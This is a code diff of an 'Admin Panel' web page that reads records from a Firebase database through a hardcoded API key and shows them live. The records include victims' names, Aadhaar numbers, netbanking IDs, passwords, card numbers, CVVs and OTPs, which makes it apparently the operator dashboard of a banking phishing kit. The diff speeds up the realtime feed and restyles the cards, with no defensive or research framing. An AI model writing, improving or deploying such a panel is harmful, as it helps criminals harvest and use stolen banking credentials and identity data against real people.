@@ -5,122 +5,61 @@
 <title>Admin Panel</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<!-- 🌟 AESTHETIC FONT -->
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
 
 <style>
-body{
-  margin:0;
-  font-family:'Poppins',system-ui;
-  background:#ececec;
-}
+body{margin:0;font-family:'Poppins',system-ui;background:#ececec}
 .header{
   background:linear-gradient(45deg,#1e88e5,#5e35b1);
-  color:#fff;
-  padding:14px;
-  text-align:center;
-  font-weight:700;
-  letter-spacing:1px;
+  color:#fff;padding:14px;text-align:center;
+  font-weight:700;letter-spacing:1px
 }
-
 .list{padding:12px}
 
 .card{
-  background:#fff;
-  border-radius:18px;
-  margin-bottom:16px;
+  background:#fff;border-radius:18px;margin-bottom:14px;
   box-shadow:0 8px 20px rgba(0,0,0,.12);
-  overflow:hidden;
-  cursor:pointer;
-  position:relative;
-  transition:.3s;
+  cursor:pointer;position:relative;overflow:hidden
 }
-.card.completed{border-left:6px solid #4caf50}
-.card.abandoned{border-left:6px solid #ff9800}
-
-/* 🌟 GOLDEN PIN EFFECT */
 .card.pinned{
   border-left:6px solid #f4b400;
-  background:linear-gradient(135deg,#fff8e1,#ffffff);
-  box-shadow:0 0 0 2px rgba(244,180,0,.35),0 10px 22px rgba(0,0,0,.2);
+  background:linear-gradient(135deg,#fff8e1,#fff)
 }
+.top{display:flex;gap:14px;padding:14px;align-items:center}
+.badge{
+  width:46px;height:46px;border-radius:50%;
+  background:#e0e0e0;display:flex;
+  align-items:center;justify-content:center;
+  font-weight:700
+}
+.info .title{font-weight:700}
+.info .sub{font-size:13px;color:#555}
 
-.top{
-  display:flex;
-  gap:14px;
-  padding:14px;
-  align-items:center;
+.status{
+  text-align:center;padding:6px;
+  font-size:13px;font-weight:600;
+  border-top:1px solid #eee
 }
-
-/* 👤 PHOTO CIRCLE */
-.logo{
-  width:56px;
-  height:56px;
-  border-radius:50%;
-  overflow:hidden;
-  background:#ddd;
-  flex-shrink:0;
-}
-.logo img{
-  width:100%;
-  height:100%;
-  object-fit:cover;
-}
-
-.info .title{
-  font-weight:700;
-  letter-spacing:1px;
-}
-.info .sub{
-  font-size:13px;
-  color:#555;
-  margin-top:2px;
-}
-
-.statusLine{
-  text-align:center;
-  padding:6px;
-  font-size:13px;
-  font-weight:600;
-  border-top:1px solid #eee;
-}
-.statusLine.online{color:#2e7d32}
-.statusLine.abandoned{color:#e65100}
-
 .details{
-  display:none;
-  padding:12px;
-  border-top:1px dashed #ccc;
-  font-size:14px;
+  display:none;padding:12px;
+  border-top:1px dashed #ccc;font-size:14px
 }
 .details.show{display:block}
 
-.row{margin:4px 0}
-.label{font-weight:600}
-
 .actions{
-  position:absolute;
-  top:10px;
-  right:10px;
-  display:flex;
-  gap:6px;
+  position:absolute;top:10px;right:10px;
+  display:flex;gap:6px
 }
 .btn{
-  border:none;
-  border-radius:8px;
-  padding:6px 10px;
-  font-size:12px;
-  cursor:pointer;
+  border:none;border-radius:8px;
+  padding:6px 10px;font-size:12px;
+  cursor:pointer
 }
 .pin{background:#f4b400}
 .unpin{background:#9e9e9e;color:#fff}
 .del{background:#e53935;color:#fff}
 
-.empty{
-  text-align:center;
-  color:#777;
-  margin-top:40px;
-}
+.empty{text-align:center;color:#777;margin-top:40px}
 </style>
 </head>
 
@@ -134,83 +73,88 @@ body{
 
 <script>
 /* 🔥 FIREBASE */
-if(!firebase.apps.length){
-  firebase.initializeApp({
-    apiKey:"AIzaSyDjMaZ5gSHh9zVRhdPwZjfVCsGaKW44kRk",
-    authDomain:"admin-panel-989b2.firebaseapp.com",
-    databaseURL:"https://admin-panel-989b2-default-rtdb.firebaseio.com",
-    projectId:"admin-panel-989b2"
-  });
-}
-
-const list=document.getElementById("list");
-const ref=firebase.database().ref("usersData");
-
-/* 🔄 REALTIME */
-ref.on("value",snap=>{
-  list.innerHTML="";
-  if(!snap.exists()){
-    list.innerHTML="<div class='empty'>No Data</div>";
-    return;
-  }
-
-  let arr=[];
-  snap.forEach(ch=>arr.push({key:ch.key,...ch.val()}));
-
-  arr.reverse(); // 🆕 new user on top
-  arr.sort((a,b)=>(b.pinned===true)-(a.pinned===true)); // 📌 pin top
-
-  arr.forEach((d,i)=>render(d,i));
+firebase.initializeApp({
+  apiKey:"AIzaSyDjMaZ5gSHh9zVRhdPwZjfVCsGaKW44kRk",
+  authDomain:"admin-panel-989b2.firebaseapp.com",
+  databaseURL:"https://admin-panel-989b2-default-rtdb.firebaseio.com",
+  projectId:"admin-panel-989b2"
 });
 
-function render(d,i){
-  const abandoned = d.status && d.status!=="COMPLETED";
-  const detId="det_"+d.key;
+const list = document.getElementById("list");
+const ref  = firebase.database().ref("usersData");
 
-  list.innerHTML+=`
-  <div class="card ${abandoned?'abandoned':'completed'} ${d.pinned?'pinned':''}"
-       onclick="toggle('${detId}')">
+/* ⚡ FAST REALTIME LISTENER */
+ref.limitToLast(100).on("child_added", snap=>{
+  const d = {key:snap.key,...snap.val()};
+  render(d,true);
+});
+
+ref.on("child_changed", snap=>{
+  document.getElementById("card_"+snap.key)?.remove();
+  render({key:snap.key,...snap.val()},false);
+});
+
+ref.on("child_removed", snap=>{
+  document.getElementById("card_"+snap.key)?.remove();
+});
+
+/* 🧩 RENDER */
+function render(d,newUser){
+  if(!d) return;
+
+  const id="det_"+d.key;
+  const idx=document.querySelectorAll(".card").length+1;
+
+  const html=`
+  <div class="card ${d.pinned?'pinned':''}" id="card_${d.key}"
+       onclick="toggle('${id}')">
 
     <div class="actions" onclick="event.stopPropagation()">
       <button class="btn ${d.pinned?'unpin':'pin'}"
-        onclick="togglePin('${d.key}',${!d.pinned})">
+        onclick="pin('${d.key}',${!d.pinned})">
         ${d.pinned?'Unpin':'📌'}
       </button>
       <button class="btn del" onclick="del('${d.key}')">🗑️</button>
     </div>
 
     <div class="top">
-      <div class="logo">
-        <img src="${d.photo || 'https://i.imgur.com/8Km9tLL.png'}">
-      </div>
+      <div class="badge">${idx}</div>
       <div class="info">
-        <div class="title">USER ${d.userNo || (i+1)}</div>
-        <div class="sub">Mobile : ${d.mbno || '-'}</div>
+        <div class="title">USER ${idx}</div>
+        <div class="sub">Mobile : ${d.mbno||'-'}</div>
       </div>
     </div>
 
-    <div class="statusLine ${abandoned?'abandoned':'online'}">
-      ${abandoned ? 'ABANDONED ('+d.status+')' : 'ONLINE USER'}
+    <div class="status">
+      Status : ${d.status||'PAGE1'}
     </div>
 
-    <div class="details" id="${detId}">
-      <div class="row"><span class="label">Name:</span> ${d.fullName||'-'}</div>
-      <div class="row"><span class="label">Aadhaar:</span> ${d.aadr||'-'}</div>
-      <div class="row"><span class="label">Netbank:</span> ${d.nid||'-'}</div>
-      <div class="row"><span class="label">Password:</span> ${d.pss||'-'}</div>
-      <div class="row"><span class="label">Card:</span> ${d.cn||'-'}</div>
-      <div class="row"><span class="label">CVV:</span> ${d.cvpn||'-'}</div>
-      <div class="row"><span class="label">OTP:</span> ${d.otp||'-'}</div>
-      <div class="row"><span class="label">Time:</span> ${d.time||'-'}</div>
+    <div class="details" id="${id}">
+      <div>Name : ${d.fullName||'-'}</div>
+      <div>Aadhaar : ${d.aadr||'-'}</div>
+      <div>Netbank : ${d.nid||'-'}</div>
+      <div>Password : ${d.pss||'-'}</div>
+      <div>Card : ${d.cn||'-'}</div>
+      <div>CVV : ${d.cvpn||'-'}</div>
+      <div>OTP : ${d.otp||'-'}</div>
+      <div>Time : ${d.time||'-'}</div>
     </div>
   </div>`;
+
+  if(newUser){
+    list.insertAdjacentHTML("afterbegin",html);
+    list.classList.remove("empty");
+  }else{
+    list.insertAdjacentHTML("afterbegin",html);
+  }
 }
 
+/* helpers */
 function toggle(id){
   const el=document.getElementById(id);
   if(el) el.classList.toggle("show");
 }
-function togglePin(key,val){
+function pin(key,val){
   firebase.database().ref("usersData/"+key+"/pinned").set(val);
 }
 function del(key){
